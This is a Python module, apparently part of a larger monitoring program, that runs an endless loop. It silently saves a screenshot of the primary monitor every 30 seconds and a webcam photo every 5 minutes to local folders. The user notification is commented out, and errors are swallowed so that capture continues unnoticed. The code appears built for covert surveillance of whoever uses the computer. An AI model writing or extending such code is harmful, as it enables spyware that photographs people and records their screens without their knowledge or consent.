import cv2
import mss
import mss.tools
import time
import os
from datetime import datetime

class OmniVisuals:
    def __init__(self, engine):
        self.engine = engine

    def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                path = os.path.join(self.engine.get_path(), "Screenshots")
                filename = f"SS_{datetime.now().strftime('%M_%S')}.jpg"
                save_path = os.path.join(path, filename)
                
                # Grab the primary monitor
                sct_img = sct.grab(sct.monitors[1])
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=save_path)
                # self.engine.notify("Visual Captured", "Screenshot saved.")
        except Exception as e:
            # If screenshot fails, log it and keep the program running
            self.engine.log_event(f"[ERROR]: Screenshot failed: {e}")

    def capture_webcam(self):
        try:
            # Try to open the default camera (index 0)
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                self.engine.log_event("[SYSTEM]: Webcam not found or disabled. Skipping.")
                return

            ret, frame = cam.read()
            if ret:
                path = os.path.join(self.engine.get_path(), "Webcam")
                filename = f"CAM_{datetime.now().strftime('%M_%S')}.jpg"
                cv2.imwrite(os.path.join(path, filename), frame)
            
            cam.release()
        except Exception as e:
            self.engine.log_event(f"[ERROR]: Webcam error: {e}")
            # If webcam fails, we release resources just in case
            if 'cam' in locals():
                cam.release()

    def run_timers(self):
        last_ss = 0
        last_cam = 0
        while True:
            try:
                now = time.time()
                # Screenshot every 30 seconds
                if now - last_ss > 30:
                    self.capture_screenshot()
                    last_ss = now
                
                # Webcam every 5 minutes
                if now - last_cam > 300:
                    self.capture_webcam()
                    last_cam = now
            except Exception as global_e:
                # This catches any weird errors in the timer itself
                self.engine.log_event(f"[CRITICAL]: Timer loop error: {global_e}")
            
            time.sleep(10)